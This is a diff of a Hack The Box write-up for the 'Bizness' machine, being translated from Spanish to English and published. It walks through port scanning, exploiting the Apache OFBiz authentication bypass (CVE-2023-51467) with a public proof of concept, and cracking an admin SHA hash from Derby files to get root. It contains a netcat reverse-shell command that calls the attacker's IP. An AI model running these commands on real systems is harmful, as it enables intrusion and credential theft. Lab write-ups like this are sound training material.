@@ -3,19 +3,22 @@ title: Bizness
 banner: /avatars/bizness.webp
 difficulty: easy
 os: linux
+pwnDate: 2024-03-05
 releaseDate: 2023-01-06
 slug: "bizness"
-isPublished: false
+isPublished: true
+shareLink: https://www.hackthebox.com/achievement/machine/701907/582
 ---
 
 import Browser from "@/components/Browser.astro" 
 
 ## Enumeration
 
-Comenzaremos por un escaneo de puertos con nmap para ver que servicios tiene expuestos al exterior.
+We will start with a port scan with nmap to see what services are exposed to the Internet.
 
+[(command explanation)](https://explainshell.com/explain?cmd=nmap+-p-+-n+-Pn+--disable-arp-ping+-sS+-sV+-sC+-vvv+-T5+10.10.11.252+-oN+bizness.nmap)
 ```bash
-sudo nmap -p- -n -Pn --disable-arp-ping -sS -sV -sC -vvv -T5 10.10.11.252 -oN Bizness.nmap
+sudo nmap -p- -n -Pn --disable-arp-ping -sS -sV -sC -vvv -T5 10.10.11.252 -oN bizness.nmap
 
 PORT      STATE SERVICE    REASON         VERSION
 22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
@@ -23,20 +26,18 @@ PORT      STATE SERVICE    REASON         VERSION
 443/tcp   open  ssl/http   syn-ack ttl 63 nginx 1.18.0
 ```
 
-Podemos ver que tiene ssh y un servicio web. Al navegar a la web nos redirige al dominio `bizness.htb` por lo que podemos observar que esta aplicando virtual hosting por lo que para solucionar el error añadimos la siguiente pareja clave valor al fichero `/etc/hosts` mediante el siguiente comando.
+We can see that it has ssh and a web service. When navigating to the web it redirects us to the domain `bizness.htb` so we can see that it is applying virtual hosting so to solve the error we add the following key value pair to the file `/etc/hosts` using the following command.
 
 ```bash
 echo "10.10.11.252 bizness.htb" | sudo tee -a /etc/hosts
 ```
-
-A continuación navegamos a la web
 
 <Browser
   url="bizness.htb"
   src="/walkthroughs/bizness/0.png"
 />
 
-Tras navegar por la web un poco podemos ver que no hay muchos enlaces por lo que podemos realizar un poco de fuzzing para descubrir nuevas rutas.
+After surfing the web for a while we can see that there are not many links so we can do some fuzzing to discover new routes.
 
 ```bash
 ffuf -u https://bizness.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 302 --recursion --recursion-depth 2
@@ -97,10 +98,10 @@ favicon.ico             [Status: 200, Size: 17479, Words: 58, Lines: 8]
 [INFO] Adding a new job to the queue: https://bizness.htb/images/rate/FUZZ
 control                 [Status: 200, Size: 34632, Words: 10468, Lines: 492]
 [INFO] Adding a new job to the queue: https://bizness.htb/passport/images/FUZZ
-:: Progress: [4727/4727] :: Job [21/21] :: 525 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
+:: Progress: [4727/4727] :: Job [21/21] :: 525 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
 ```
 
-Tras haber realizado el escaneo vamos navegado por los diferentes enlaces para ver cual funciona y podemos ver que el primero nos redirige a: `bizness.htb/accounting/control/main`
+After having performed the scan we browse through the different links to see which one works and we can see that the first one redirects us to: [bizness.htb/accounting/control/main](http://bizness.htb/accounting/control/main).
 
 <Browser
   url="bizness.htb/accounting/control/main"
@@ -109,11 +110,15 @@ Tras haber realizado el escaneo vamos navegado por los diferentes enlaces para v
 
 ## Exploitation
 
-Como se puede ver en la página mostrada anteriormente, abajo a la derecha podemos ver que pone [Apache OFBiz](https://ofbiz.apache.org/) por lo que trás realizar una pequeña busqueda encontramos que es una aplicación para automatizar procesos empresariales y que ademas tiene esta vulnerabilidad [CVE-2023-51467](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-51467).
+As you can see in the page shown above, at the bottom right we can see that it says [Apache OFBiz](https://ofbiz.apache.org/) so after a little search we found that it is an application to automate business processes and also has this vulnerability [CVE-2023-51467](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-51467).
 
-Buscando "apache ofbiz exploit poc" me sale como primer resultado: [Apache OFBiz Authentication Bypass Vulnerability](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git)
+Searching for "apache ofbiz exploit poc" I get: [Apache OFBiz Authentication Bypass Vulnerability](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git)
 
-Leyendo un poco el readme que deja en el repositorio parece bastante sencillo de probar así que en una terminal realizamos el clone y nos preparamos para lanzar la POC con una revershell y en otro terminal nos preparamos una escucha con netcat.
+Reading a little the readme that leaves in the repository seems quite simple to test so in a terminal we make the clone and we prepare to launch the POC with a revershell and in another terminal we prepare a listener with netcat.
+
+```bash
+nc -lvnp 5000
+```
 
 ```bash
 git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
@@ -121,15 +126,11 @@ cd Apache-OFBiz-Authentication-Bypass
 python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.14.199 5000'
 ```
 
-```bash
-nc -lvnp 5000
-```
-
-Una vez ejecutados estos 2 grupos de comandos conseguiremos nuestra revershell
+Once these 2 sets of commands have been executed we will get our revershell
 
 ## Post Exploitation
 
-Siguiendo esta [guía](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys) mejoramos nuestra shell para que sea completamente interactiva y podamos trabajar más comodamente.
+By following this [guide](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys) we improve our shell so that it is fully interactive and we can work more comfortably.
 
 ```bash
 script /dev/null -qc /bin/bash 
@@ -154,7 +155,7 @@ stty rows 38 columns 116;
 reset;
 ```
 
-una vez ya estamos comodos, ya podemos recuperar nuestra flag para el usuario normal.
+once we are comfortable, we can take our flag.
 
 ```bash
 ofbiz@bizness:/opt/ofbiz$ ls ~/
@@ -165,9 +166,8 @@ ofbiz@bizness:/opt/ofbiz$ cat ~/user.txt
 
 ##  Privilege escalation
 
-Para conseguir la flag del usuario root investigamos por los ficheros de la aplicacion ofbiz y encontramos lo que es una bbdd relacional llamada [derby](https://db.apache.org/derby/docs/10.13/devguide/cdevdvlp40724.html)
-
-Como dice en el mensaje "INCLUDES THE DATA (USER AND SYSTEM)" por lo que parece ser un directorio candidato a ser investigado
+To get the root flag we searched through the ofbiz application files and found what is a relational database named [derby](https://db.apache.org/derby/docs/10.13/devguide/cdevdvlp40724.html)
+As it says in the message "INCLUDES THE DATA (USER AND SYSTEM)" so it seems to be a candidate directory to be investigated.
 
 ```bash
 ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz$ cat README_DO_NOT_TOUCH_FILES.txt 
@@ -182,11 +182,11 @@ ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz$ cat README_DO_NOT_TOUCH_FILES
 # *************************************************************************
 ```
 
-Según chatgpt, el contenido de lo que puede albergar .../seg0 es:
+According to chatgpt, the content of what can be hosted by .../seg0 is:
 
-"La carpeta seg0 contiene los archivos de datos donde Derby almacena las tablas y los índices de la base de datos. Estos archivos son binarios y no están destinados a ser leídos o modificados directamente por los usuarios. "
+"The seg0 folder contains the data files where Derby stores the database tables and indexes. These files are binary and are not intended to be read or modified directly by users. "
 
-Realizo el siguiente comando para ver que archivos pueden ser candidatos a almacenar algún tipo de información a lo que nos habían prometido en el mensaje del README anterior buscando así el usuario `ofbiz` en todas las cadenas de caracteres extraidas de los ficheros almacenados en el directorio.
+I run the following command to see which files may be candidates to store some kind of information as promised in the README message above, searching for the user `ofbiz` in all the strings extracted from the files stored in the directory.
 
 ```bash
 ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ find ./ -type f -exec sh -c 'if strings "{}" 2>/dev/null | grep -q "ofbiz"; then echo "{}"; fi' \; | sort
@@ -211,7 +211,7 @@ ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ find ./ -type f -exec sh
 ./cf1a1.dat
 ```
 
-tras revisar los ficheros 1 a 1 podemos observar que el primer fichero que almacena un fichero interesante es `c54d0.dat` de donde extraemos que hay un usuario admin en la app con la contraseña cifrada con SHA
+after reviewing the files 1 by 1 we can observe that the first file that stores an interesting file is `c54d0.dat` from where we extract that there is an admin user in the app with the password encrypted using SHA
 
 ```bash
 ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ strings ./c54d0.dat | grep admin
@@ -220,7 +220,7 @@ userLoginId="admin"
 currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
 ```
 
-Tras haber ejecutado hashcat y rebir un error por el formato de las password y buscar en internet el error se debe a que parece estar codeado para urlbas64 por lo que procedo a dejarlo en un formato correcto para que hashcat lo pueda procesar.
+After running hashcat and getting an error due to the password format and searching the internet the error is because it seems to be coded for urlbase64 so I proceed to leave it in a correct format so hashcat can process it.
 
 ```bash
 echo "uP0/QaVBpDWFeo8+dRzDqRwXQ2I" | tr "_-" "/+" | base64 -d | xxd -p
@@ -229,7 +229,7 @@ base64: invalid input
 b8fd3f41a541a435857a8f3e751cc3a91c174362
 ```
 
-A continuación procedemos a crackear el hash utilizando las wordlist `rockyou.txt`
+Then we proceed to crack the hash using the wordlist `rockyou.txt`.
 
 ```bash
 sudo hashcat -m 120 -a 0 -d 1 "b8fd3f41a541a435857a8f3e751cc3a91c174362:d" /usr/share/wordlists/rockyou.txt
@@ -237,7 +237,7 @@ sudo hashcat -m 120 -a 0 -d 1 "b8fd3f41a541a435857a8f3e751cc3a91c174362:d" /usr/
 b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  
 ```
 
-Tras obtener con éxito la contraseña procedemos a logearnos como root y obtener así nuestra flag.
+After successfully obtaining the password we proceed to log in as root and obtain our flag.
 
 ```bash
 su root
